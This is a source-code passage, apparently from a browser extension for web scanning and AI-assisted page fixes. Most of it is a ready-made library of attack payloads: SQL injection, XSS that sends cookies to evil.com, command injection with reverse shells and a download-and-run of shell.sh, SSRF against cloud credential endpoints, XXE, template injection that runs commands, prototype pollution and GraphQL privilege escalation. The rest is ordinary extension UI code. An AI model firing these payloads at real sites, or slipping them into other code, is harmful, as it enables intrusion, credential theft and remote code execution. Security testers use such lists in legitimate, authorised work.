  { name: 'Bootstrap', test: (h, b) => /bootstrap(?:[-.]\d|\.min)/i.test(b) },
  { name: 'Drupal', test: (h, b) => /drupal\.settings|sites\/(default|all)\//i.test(b) || /drupal/i.test(h['x-generator'] || '') },
  { name: 'Joomla', test: (h, b) => /\/media\/jui\/|joomla/i.test(b) },
];

const PAYLOAD_LIB = {
  sql: [
    "' OR '1'='1", "\" OR \"1\"=\"1", "1' OR '1'='1' --", "admin'--",
    "1; DROP TABLE users--", "1' UNION SELECT NULL--",
    "1' UNION SELECT username, password FROM users--",
    "1' AND SLEEP(5)--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' OR 1=1--", "') OR ('1'='1", "1' AND extractvalue(1,concat(0x7e,version()))--",
    "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
    "1; EXEC xp_cmdshell('whoami')--", "1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--",
    "1' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
    "1' GROUP BY CONCAT(0x7e,version(),0x7e) HAVING 1=1--",
    "1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)--",
    "0; WAITFOR DELAY '0:0:5'--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "1' UNION ALL SELECT NULL,username,password FROM users--",
    "1' AND (SELECT 2137 FROM(SELECT COUNT(*),CONCAT(0x7178707171,(SELECT (ELT(2137=2137,1))),0x71627a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
    "1 UNION SELECT @@version,NULL--",
    "1' AND 1=(SELECT 1 FROM information_schema.tables LIMIT 1)--",
    "1'; EXEC sp_makewebtask '/tmp/x.asp','SELECT ''<%%=CreateObject(request(\"c\"))%%>''--",
    "1' OR 'unusual'='unusual",
    "' HAVING 1=1--",
    "' ORDER BY 1--",
    "' ORDER BY 2--",
    "' ORDER BY 10--",
    "1' AND ASCII(SUBSTRING(password,1,1))>64--",
    "1' AND ASCII(SUBSTRING(password,1,1))=97--",
    "1' OR SLEEP(5)--",
    "1 OR 1=1--",
    "1' PROCEDURE ANALYSE()--",
    "1; SELECT LOAD_FILE('/etc/passwd')--",
    "1' UNION SELECT table_name,column_name FROM information_schema.columns--",
    "1' AND (SELECT COUNT(*) FROM users)>0--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))aiud)--",
    "1' UNION SELECT schema_name,NULL FROM information_schema.schemata--",
    "1'; DECLARE @q NVARCHAR(200) SET @q='DROP TABLE users' EXEC(@q)--",
    "0x27 OR 0x31=0x31--",
    "1' AND GTID_SUBSET(CONCAT(0x7178707171,(SELECT (ELT(3414=3414,1))),0x71627a7171),3414)--",
  ],
  xss: [
    '<script>alert(1)</script>', '"><script>alert(1)</script>',
    '<img src=x onerror=alert(1)>', "<svg onload=alert(1)>",
    "javascript:alert(1)", "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>", "'\"--></style></script><svg onload=alert(1)>",
    "<details open ontoggle=alert(1)>", "<input autofocus onfocus=alert(1)>",
    "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
    "<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<math><mtext></mtext><mglyph><svg><mtext></mtext><svg onload=alert(1)>",
    "<<SCRIPT>alert(1)//<</SCRIPT>",
    "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert(1)\">",
    "<script>new Image().src='https://evil.com/?c='+document.cookie</script>",
    "<svg><script>alert&#40;1&#41;</script></svg>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<table background=javascript:alert(1)>",
    "<script>window.location='https://evil.com/?c='+encodeURIComponent(document.cookie)</script>",
    "<video><source onerror=alert(1)>",
    "<input type=image src=x onerror=alert(1)>",
    "'\"><img src=x onerror=alert(document.domain)>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "<a href=javascript:void(0) onmouseover=alert(1)>hover</a>",
    "<form action=javascript:alert(1)><input type=submit>",
    "<script>setTimeout(alert,0,1)</script>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
  ],
  cmd: [
    '; ls', '| ls', '|| ls', '&& ls', '`ls`', '$(ls)',
    '; cat /etc/passwd', '| cat /etc/passwd',
    '; whoami', '`whoami`', '$(whoami)',
    '; sleep 5', '|| sleep 5', '%0a ls', '%0a id',
    '| net user', '; net user', '& net user',
    '; curl http://evil.com/$(whoami)', '`curl http://evil.com/$(id)`',
    '; python3 -c "import os;os.system(\'id\')"',
    '| bash -i >& /dev/tcp/evil.com/4444 0>&1',
    '; id', '| id', '&& id', '$(id)', '`id`',
    '; ls -la /etc/', '| cat /etc/shadow',
    '; ping -c 1 evil.com', '| ping -c 1 evil.com',
    '; nc -e /bin/sh evil.com 4444',
    '; /bin/bash -c "bash -i >& /dev/tcp/evil.com/4444 0>&1"',
    '& dir', '| dir', '; dir',
    '; type C:\\Windows\\win.ini', '| type C:\\Windows\\win.ini',
    '; powershell -c "Get-Process"', '| powershell -c whoami',
    '; python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'evil.com\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"',
    '; wget http://evil.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh',
    '%0a%0d id %0a%0d',
    '$(cat /etc/passwd)',
    '`cat /etc/passwd`',
    '; printenv', '| env',
    '; ps aux', '| ps aux',
    '; ifconfig', '; ip addr',
    '; curl -s http://169.254.169.254/latest/meta-data/',
  ],
  traversal: [
    '../../../../etc/passwd', '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
    '....//....//....//etc/passwd', '..%252f..%252f..%252fetc%252fpasswd',
    '/etc/passwd', '/etc/passwd%00', 'C:\\Windows\\win.ini',
    '..\\..\\..\\windows\\win.ini', 'file:///etc/passwd',
    '/proc/self/environ', '/var/log/apache2/access.log',
    '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
    '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    '....\/....\/....\/etc/passwd',
    '///..//..//..//etc/passwd',
    '/etc/shadow', '/etc/hosts', '/proc/self/cmdline',
    '..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
    '..%5c..%5c..%5cwindows%5cwin.ini',
    '....%2f....%2f....%2fetc%2fpasswd',
    '%252e%252e%252f%252e%252e%252fetc%252fpasswd',
    '/etc/passwd%2500',
    'php://filter/read=convert.base64-encode/resource=/etc/passwd',
    'php://input',
    'expect://id',
    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
    '..././..././..././etc/passwd',
    '/%5C../%5C../%5C../etc/passwd',
    '/..%255c..%255c..%255cwindows/win.ini',
    '\\..\\.\\..\\windows\\win.ini',
    '/var/log/nginx/access.log',
    '/proc/version',
    '/etc/issue',
  ],
  ssrf: [
    'http://127.0.0.1', 'http://localhost', 'http://0.0.0.0',
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    'http://[::1]', 'http://127.1', 'http://127.0.0.1:22',
    'http://127.0.0.1:6379', 'gopher://127.0.0.1:6379/_INFO',
    'file:///etc/passwd', 'dict://127.0.0.1:11211/stats',
    'http://0177.0.0.1/', 'http://0x7f000001/',
    'http://127.0.0.1:2375/version',
    'https://kubernetes.default.svc/api',
    'http://[::ffff:127.0.0.1]/',
    'http://[::ffff:7f00:1]/',
    'http://0x7f.0x0.0x0.0x1/',
    'http://2130706433/',
    'http://127.000.000.001/',
    'http://localhost:8080/admin',
    'http://localhost:8443/admin',
    'http://internal.corp.example.com/',
    'http://169.254.169.254/latest/user-data',
    'http://169.254.169.254/latest/meta-data/hostname',
    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
    'http://169.254.170.2/v2/credentials/',
    'http://127.0.0.1:9200/_cat/indices',
    'http://127.0.0.1:5601/',
    'http://127.0.0.1:8500/v1/kv/?recurse',
    'http://127.0.0.1:4040/api/tunnels',
    'http://127.0.0.1:9090/metrics',
    'http://127.0.0.1:3000/',
    'http://localhost:11211/stats',
    'gopher://127.0.0.1:11211/_stats',
  ],
  nosql: [
    "{\"$ne\":null}", "{\"$gt\":\"\"}", "{\"$regex\":\".*\"}",
    "[$ne]=", "'; return true; var x='", "true, $where: '1 == 1'",
    "{\"$where\":\"sleep(5000)\"}", "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
    "{\"$or\":[{\"username\":\"admin\"},{\"username\":{\"$ne\":\"x\"}}]}",
    "{\"password\":{\"$regex\":\"^a\"}}", "';return(true);var x='",
    "{\"$nin\":[]}", "{\"$exists\":true}",
    "{\"$gt\":-1}", "{\"$gte\":0}",
    "{\"$in\":[\"admin\",\"root\",\"superuser\"]}",
    "{ $where: function() { return true; } }",
    "{\"username\":{\"$regex\":\"^admin\"},\"password\":{\"$regex\":\".*\"}}",
    "{\"$comment\":\"injected\",\"$where\":\"1==1\"}",
    "' || '1'=='1", "' && '1'=='1",
    "admin' && this.password.match(/.*/)//+%00",
    "{\"$lookup\":{\"from\":\"users\",\"localField\":\"a\",\"foreignField\":\"a\",\"as\":\"x\"}}",
    "[$regex]=.*",
    "[$exists]=true",
  ],
  template: [
    '{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}',
    '{{config.items()}}', '${T(java.lang.Runtime).getRuntime().exec("id")}',
    '{{"".__class__.__mro__[1].__subclasses__()}}',
    '{%for c in [1,2,3]%}{{c}}{%endfor%}',
    '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
    "#set($x='')+$x.class.forName(\"java.lang.Runtime\").getMethod(\"exec\",\"\".class).invoke($x.class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\")",
    '${{"freemarker.template.utility.Execute"?new()("id")}',
    '@{7*7}', '*{7*7}', '${{7*7}}',
    '{{7*\'7\'}}',
    '{7*7}',
    '[[7*7]]',
    '${7*7}#{7*7}',
    '<%=7*7%>',
    '{#7*7}',
    '{% debug %}',
    '{{settings.SECRET_KEY}}',
    '{{request.META}}',
    '{{cycler.__init__.__globals__.os.popen("id").read()}}',
    '{{joiner.__init__.__globals__.os.popen("id").read()}}',
    '{{namespace.__init__.__globals__.os.popen("id").read()}}',
    '${mainTemplate.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke(mainTemplate.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}',
    '{% for i in range(1,2) %}{{i.__class__.__mro__[-1].__subclasses__()}}{% endfor %}',
    '<#list .data_model?keys as key>${key}</#list>',
  ],
  ldap: [
    '*', '*)(uid=*', '*)(|(uid=*', 'admin*', '*)(&', '*)((|', 'admin)(&(password=*))',
    '*(|(objectclass=*))', '*)(uid=*))(|(uid=*', 'x))(cn=*',
    '*)(cn=*', '*)(sn=*', '*(|(mail=*))',
    'admin)(|(password=*))',
    '*)(|(objectClass=person)(objectClass=user))',
    ')(cn=*',
    'admin*)((|userPassword=*)',
    '*))%00',
    '*))(|(cn=*',
  ],
  xxe: [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><root>&xxe;</root>',
    '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]><root/>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.corp.example.com/admin">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hostname">]><data>&file;</data>',
  ],
  json_injection: [
    '{"__proto__":{"admin":true}}',
    '{"constructor":{"prototype":{"admin":true}}}',
    '{"__proto__":{"isAdmin":true,"role":"admin"}}',
    '{"a":"b","admin":true}',
    '{"role":"admin","__proto__":{"role":"admin"}}',
    '{}; DROP TABLE users;--',
    '{"$where":"sleep(5000)"}',
    '{"type":"__proto__","value":"polluted"}',
    '{"__proto__":{"isAdmin":true,"isPremium":true,"subscription":"enterprise","credits":999999}}',
    '{"constructor":{"prototype":{"isAdmin":true,"role":"superadmin","level":9999}}}',
    '{"__proto__":{"admin":true,"staff":true,"superuser":true,"root":true}}',
    '{"$ne":null,"$regex":".*","$gt":"","$gte":0}',
    '{"amount":{"$ne":0},"price":{"$lt":0}}',
    '{"userId":{"$ne":null},"role":{"$in":["admin","superuser","root"]}}',
    '{"__proto__":{"toString":"function(){return \'admin\'}","valueOf":"function(){return 1}"}}',
    '{"key":"value\",\"admin\":true,\"injected\":\""}',
  ],
  prototype_pollution: [
    '__proto__[admin]=true', 'constructor[prototype][admin]=true',
    '__proto__.admin=true', '__proto__[isAdmin]=true',
    'constructor.prototype.admin=true', '__proto__[role]=admin',
    '?__proto__[polluted]=YES', '?constructor[prototype][polluted]=YES',
    '__proto__[isPremium]=true', '__proto__[subscription]=enterprise',
    '__proto__[credits]=999999', '__proto__[balance]=9999999',
    'constructor[prototype][isStaff]=true', '__proto__[accessLevel]=9999',
    '__proto__[isOwner]=true', '__proto__[userType]=admin',
    'Object.prototype.admin=true',
    '?__proto__[role]=superadmin&__proto__[isPremium]=true',
  ],
  crlf: [
    '%0d%0aSet-Cookie:crlf=injected', '\r\nSet-Cookie:crlf=injected',
    '%0aSet-Cookie:crlf=injected', '\nSet-Cookie:crlf=injected',
    '%0d%0aX-Injected-Header:1', '%0d%0aLocation:https://evil.example.com',
    '%0d%0a%0d%0a<script>alert(1)</script>', 'foo%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>',
    '%E5%98%8A%E5%98%8DSet-Cookie:crlf=injected', '%c0%8aSet-Cookie:crlf=injected',
    '\r\n\r\n<svg onload=alert(1)>',
    '%0d%0aX-Forwarded-For:127.0.0.1%0d%0aX-Admin:true',
    '%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>injected</html>',
    '%0a%0dSet-Cookie:admin=1;path=/',
    '%23%0aSet-Cookie:injected=true',
    'foo\r\nSet-Cookie:session=hacked; Path=/; HttpOnly',
    '%0d%0aTransfer-Encoding:chunked%0d%0a',
    '%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200',
    '%0d%0aX-XSS-Protection:0%0d%0a',
    '%0d%0aAccess-Control-Allow-Origin:*%0d%0a',
  ],
  host_header: [
    'evil.example.com', 'evil.example.com:80', 'evil.example.com:443',
    'trusted.site.com.evil.example.com', 'evil.example.com#.trusted.site.com',
    '127.0.0.1', '0.0.0.0', 'localhost',
    'internal.corp.example.com',
    'evil.example.com%0d%0aX-Forwarded-Host:evil.example.com',
    'attacker.com',
    'target.com.attacker.com',
    'target.com@attacker.com',
    'attacker.com/target.com',
    'target.com%40attacker.com',
    'target.com&host=attacker.com',
    '169.254.169.254',
    'metadata.google.internal',
    'kubernetes.default.svc',
  ],
  graphql: [
    '{ __schema { types { name } } }',
    '{ __type(name:"Query"){ fields { name args { name } } } }',
    '{ users { id email password role } }',
    '{ user(id:1) { id email password isAdmin creditBalance } }',
    'query A{u:users{id}} query B{u:users{email}}',
    '{ a1:user(id:1){e:email} a2:user(id:2){e:email} a3:user(id:3){e:email} a4:user(id:4){e:email} a5:user(id:5){e:email} }',
    '{ users { ... on User { __typename email password isAdmin } } }',
    'mutation { deleteUser(id:1) { success } }',
    'mutation { updateUser(id:1, role:"admin") { id role } }',
    '{ __schema { subscriptionType { name fields { name } } } }',
    'mutation{login(username:"admin",password:"\'OR\'1\'=\'1"){token}}',
    '{ __schema { queryType { fields { name description } } mutationType { fields { name description } } } }',
    'query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated:true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated:true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }',
    '{ __type(name: "Mutation") { fields { name args { name type { name } } } } }',
    'mutation { updateBalance(userId:1, amount:999999) { success balance } }',
    'mutation { grantAdmin(userId:1) { id role isAdmin } }',
    '{ orders { id price user { id email role } } }',
    '{ payments { id amount status userId cardNumber } }',
    '{ adminUsers: users(filter:{role:"admin"}) { id email } }',
  ],
  business_logic: [
    '-1', '-999999', '0', '0.0001', '0.00000001',
    '2147483648', '-2147483649', '9999999999999999',
    'NaN', 'Infinity', '-Infinity', 'null', 'undefined',
    '{"$gt":0}', '{"$ne":null}', '1e308', '-1e308',
    '9007199254740993', '-9007199254740993',
    '"string_instead_of_number"', 'true', 'false',
    '[]', '{}', '[1,2,3]', '{"amount":9999}',
    '-0', '0.0', '-0.0', '0e0',
    '9223372036854775807', '-9223372036854775808',
    '1.7976931348623157E+308', '-1.7976931348623157E+308',
    '1e-324', '5e-324',
    '"NaN"', '"Infinity"', '"null"', '"undefined"',
    '{"amount":-1,"price":-1}',
    '{"quantity":-99999,"price":0.001}',
    '1.000000000000001',
  ],
  ssti_advanced: [
    '{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}', '@(7*7)', '*{7*7}',
    '{{config}}', '{{config.items()}}', '{{request.environ}}',
    '{{self.__dict__}}', '{{"".__class__.__mro__}}',
    '{{"".__class__.__mro__[1].__subclasses__()[408]("id",shell=True,stdout=-1).communicate()[0].strip()}}',
    '{{request|attr("application")|attr("\\x5f\\x5fglobals\\x5f\\x5f")|attr("\\x5f\\x5fgetitem\\x5f\\x5f")("\\x5f\\x5fbuiltins\\x5f\\x5f")|attr("\\x5f\\x5fgetitem\\x5f\\x5f")("\\x5f\\x5fimport\\x5f\\x5f")("os")|attr("popen")("id")|attr("read")()}}',
    '${T(java.lang.Runtime).getRuntime().exec("id")}',
    '#{T(java.lang.Runtime).getRuntime().exec("id")}',
    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    '{php}echo shell_exec("id");{/php}',
    '{system("id")}', '{exec("id")}',
    'a{*comment*}b', '{{ "".__class__.__bases__[0].__subclasses__() }}',
    '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}',
    '{{this.constructor.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}',
    '#set($s="")#set($stringClass=$s.getClass())#set($runtime=$stringClass.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null))#set($process=$runtime.exec("id"))#set($inputStream=$process.getInputStream())#set($reader=new java.io.InputStreamReader($inputStream))#set($bufferedReader=new java.io.BufferedReader($reader))$bufferedReader.readLine()',
    '{{\'\'.__class__.mro()[1].__subclasses__()[396](\'id\',shell=True,stdout=-1).communicate()[0].strip()}}',
    '${{"freemarker.template.utility.Execute"?new()("whoami")}',
    '@{(1+1)}',
    '#{1+1}',
    '[[${7*7}]]',
    '${7*7}${"".class.forName("java.lang.Runtime")}',
    '{%import os%}{{os.system(\'id\')}}',
    '<script>{{7*7}}</script>',
  ],
};

let activeTabId = null;
let activeTabUrl = null;
let selectedSnapshot = null;
let lastFix = null;
let securityFindings = []; // accumulated for AI triage

async function getActiveTab() {
  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
  if (tab) {
    activeTabId = tab.id;
    activeTabUrl = tab.url;
  }
  return { id: activeTabId, url: activeTabUrl };
}

function isSafeWebUrl(url) {
  if (!url) return false;
  return url.startsWith('http://') || url.startsWith('https://');
}

function requireWebTab() {
  const url = activeTabUrl || '';
  if (!isSafeWebUrl(url)) {
    const scheme = url.split(':')[0] || 'unknown';
    throw new Error('Cannot run on this page (' + scheme + ':// is not supported). Open any real website in your browser tab first, then try again.');
  }
}

async function ensureContentScript(tabId) {
  try { await chrome.tabs.sendMessage(tabId, { type: 'PING' }); }
  catch {
    try { await chrome.scripting.executeScript({ target: { tabId }, files: ['content.js'] }); }
    catch { throw new Error('Cannot run on this page (try a normal http(s) site).'); }
  }
}

async function send(tabId, msg) {
  await ensureContentScript(tabId);
  return new Promise((resolve, reject) => {
    chrome.tabs.sendMessage(tabId, msg, (res) => {
      if (chrome.runtime.lastError) return reject(new Error(chrome.runtime.lastError.message));
      if (!res?.ok) return reject(new Error(res?.error || 'Unknown error'));
      resolve(res);
    });
  });
}
async function bg(msg) {
  const isFetch = msg && msg.type === 'RUN_FETCH' && msg.params;
  const startedAt = isFetch ? Date.now() : 0;
  if (isFetch) {
    const p = msg.params;
    const method = (p.method || 'GET').toUpperCase();
    const u = String(p.url || '');
    const shortUrl = u.length > 90 ? u.slice(0, 87) + '...' : u;
    const hdrCount = p.headers ? Object.keys(p.headers).length : 0;
    const bodyPreview = p.body ? ` body=${String(p.body).slice(0, 80).replace(/\n/g, ' ')}` : '';
    if (typeof termWrite === 'function') termWrite('running', `[REQ] ${method} ${shortUrl} hdrs=${hdrCount} cred=${p.credentials || 'omit'}${bodyPreview}`);
  }
  return new Promise((resolve, reject) => {
    chrome.runtime.sendMessage(msg, (res) => {
      if (chrome.runtime.lastError) return reject(new Error(chrome.runtime.lastError.message));
      if (!res?.ok) {
        if (isFetch && typeof termWrite === 'function') termWrite('error', `[ERR] ${msg.params.url} → ${res?.error || 'no response'}`);
        return reject(new Error(res?.error || 'Background error'));
      }
      if (isFetch && typeof termWrite === 'function') {
        const ms = Date.now() - startedAt;
        const status = res.status ?? '?';
        const bytes = res.body ? String(res.body).length : 0;
        const preview = res.body ? String(res.body).slice(0, 140).replace(/\s+/g, ' ') : '';
        const ct = res.headers && (res.headers['content-type'] || res.headers['Content-Type']) || '';
        termWrite('done', `[RES] ${status} ${ct ? '['+ct.split(';')[0]+'] ' : ''}${bytes}B in ${ms}ms ← ${preview}${bytes > 140 ? '...' : ''}`);
      }
      resolve(res);
    });
  });
}
async function aiRequest(mode, user) { return bg({ type: 'AI_REQUEST', mode, user }); }

function showResult(label, code) {
  $('#resultLabel').textContent = label;
  $('#fixCode').textContent = code;
  $('#result').classList.remove('hidden');
}
function setSelectedInfo(snap) {
  if (!snap) { $('#selectedInfo').classList.add('hidden'); return; }
  $('#selectedInfo').classList.remove('hidden');
  $('#selectedInfo').textContent = 'Selected: ' + snap.selector + (snap.codeText ? ' [code]' : '');
}
function setAttached(on) {
  const b = $('#attachBadge');
  b.textContent = on ? 'debugger on' : 'debugger off';
  b.className = 'badge ' + (on ? 'on' : 'off');
}
function escapeHtml(s) {
  return String(s).replace(/[&<>"']/g, (c) =>
    ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c]));
}

document.querySelectorAll('.tab').forEach((t) => {
  t.addEventListener('click', () => {
    document.querySelectorAll('.tab').forEach((x) => x.classList.remove('active'));
    document.querySelectorAll('.tab-panel').forEach((x) => x.classList.remove('active'));
    t.classList.add('active');
    $('#' + t.dataset.tab + 'Tab').classList.add('active');
    if (t.dataset.tab === 'manual') refreshHeaderRules();
  });
});

$('#settingsBtn').addEventListener('click', async () => {
  const panel = $('#settingsPanel');
  panel.classList.toggle('hidden');
  if (!panel.classList.contains('hidden')) {
    const { apiKey, model, ollamaUrl, ollamaModel, customApiUrl, customApiKey, customModel } = await chrome.storage.local.get(['apiKey','model','ollamaUrl','ollamaModel','customApiUrl','customApiKey','customModel']);
    $('#apiKey').value = apiKey || '';
    $('#model').value = model || 'gpt-4o-mini';
    $('#ollamaUrl').value = ollamaUrl || '';
    $('#ollamaModel').value = ollamaModel || '';
    $('#customApiUrl').value = customApiUrl || '';
    $('#customApiKey').value = customApiKey || '';
    $('#customModel').value = customModel || '';
  }
});
$('#saveKey').addEventListener('click', async () => {
  await chrome.storage.local.set({
    apiKey: $('#apiKey').value.trim(),
    model: $('#model').value,
    ollamaUrl: $('#ollamaUrl').value.trim(),
    ollamaModel: $('#ollamaModel').value.trim(),
    customApiUrl: $('#customApiUrl').value.trim(),
    customApiKey: $('#customApiKey').value.trim(),
    customModel: $('#customModel').value.trim(),
  });
  $('#settingsPanel').classList.add('hidden');
  status('Settings saved.', 'ok');
});

$('#selectBtn').addEventListener('click', async () => {
  try {
    const { id } = await getActiveTab();
    await send(id, { type: 'START_SELECT' });
    status('Hover and click an element. Esc to cancel.');
    window.close();
  } catch (err) { status(err.message, 'error'); }
});

$('#manualRun').addEventListener('click', async () => {
  const prompt = $('#manualPrompt').value.trim();
  if (!prompt) return status('Type an instruction first.', 'error');
  try {
    const { id } = await getActiveTab();
    const sel = await send(id, { type: 'GET_SELECTED' });
    selectedSnapshot = sel.data;
    setSelectedInfo(selectedSnapshot);
    const ctx = selectedSnapshot
      ? `Selector: ${selectedSnapshot.selector}\nTag: ${selectedSnapshot.tag}\nClasses: ${selectedSnapshot.classes.join(' ')}\nStyles: ${JSON.stringify(selectedSnapshot.styles)}\nHTML: ${selectedSnapshot.html}`
      : 'No element selected — write generic CSS targeting the most likely selector inferred from the request.';
    status('Asking AI...');
    const res = await aiRequest('manual', `${ctx}\n\nRequest: ${prompt}`);
    lastFix = { lang: res.lang, code: res.code };
    showResult(`Suggested ${res.lang.toUpperCase()} fix`, res.code);
    status('');
  } catch (err) { status(err.message, 'error'); }
});

$('#autoRun').addEventListener('click', async () => {
  try {
    const { id } = await getActiveTab();
    status('Scanning page...');
    const scan = await send(id, { type: 'SCAN' });
    const data = scan.data;
    if (!data.issues.length && !data.consoleErrors.length) {
      status('No obvious issues found.', 'ok');
      $('#result').classList.add('hidden'); return;
    }
    const user =
      `Page: ${data.title}\nIssues:\n` +
      (data.issues.map((i, n) => `${n + 1}. ${i.type} -> ${i.selector}`
        + (i.otherSelector ? ' overlaps ' + i.otherSelector : '')
        + (i.ratio ? ' (contrast ' + i.ratio + ')' : '')
        + (i.text ? ' "' + i.text + '"' : '')).join('\n') || 'none') +
      `\nConsole errors:\n${data.consoleErrors.join('\n').slice(0, 500) || 'none'}`;
    status('Asking AI...');
    const res = await aiRequest('auto', user);
    lastFix = { lang: res.lang || 'css', code: res.code };
    showResult(`Suggested ${lastFix.lang.toUpperCase()} fixes (${data.issues.length} issues)`, lastFix.code);
    status('');
  } catch (err) { status(err.message, 'error'); }
});

$('#attachBtn').addEventListener('click', async () => {
  try {
    const { id } = await getActiveTab();
    await bg({ type: 'ATTACH_DEBUGGER', tabId: id });
    setAttached(true);
    status('Debugger attached. Interact with the page to capture events.', 'ok');
  } catch (err) { status(err.message, 'error'); }
});
$('#detachBtn').addEventListener('click', async () => {
  try {
    const { id } = await getActiveTab();
    await bg({ type: 'DETACH_DEBUGGER', tabId: id });
    setAttached(false);
    status('Debugger detached.', 'ok');
  } catch (err) { status(err.message, 'error'); }
});

$('#analyzeNet').addEventListener('click', async () => {
  try {
    const { id } = await getActiveTab();
    const state = await bg({ type: 'GET_DEBUG_STATE', tabId: id });
    const list = state.networkLog || [];
    renderNetList(list);
    if (!list.length) { status('No failing requests captured yet.', 'ok'); return; }
    const enriched = [];
    let bodiesFetched = 0;
    for (const r of list.slice(-15)) {
      const item = { url: r.url, method: r.method, status: r.status, error: r.error, type: r.type };
      if (state.attached && r.source === 'cdp' && r.requestId && bodiesFetched < 3) {
        try {
          const res = await bg({ type: 'GET_RESPONSE_BODY', tabId: id, requestId: r.requestId });
          item.requestHeaders = res.meta?.headers;
          item.responseHeaders = res.meta?.responseHeaders;
          item.bodySnippet = res.body;
          bodiesFetched++;
        } catch (_) {}
      }
      enriched.push(item);
    }
    const user = `URL: ${activeTabUrl}\nFailing requests (${enriched.length}):\n` +
      enriched.map((r, n) =>
        `${n + 1}. [${r.method || '-'}] ${r.status || r.error || '?'} ${r.url}`
        + (r.requestHeaders ? '\n   reqH: ' + JSON.stringify(r.requestHeaders).slice(0, 300) : '')
